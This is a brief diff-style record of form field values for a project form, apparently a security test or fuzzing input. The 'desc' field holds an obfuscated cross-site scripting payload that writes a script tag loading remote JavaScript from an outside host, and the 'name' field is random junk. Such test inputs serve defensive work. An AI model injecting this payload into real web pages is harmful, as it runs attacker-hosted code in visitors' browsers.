@@ -1,0 +1,6 @@
+name : i1B'.'5T  wB'..7 gv8'S'.7.:.
+desc : <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+end : 27.6.2016
+budget : 7,464
+assignto[] : 1
+assignme : 1
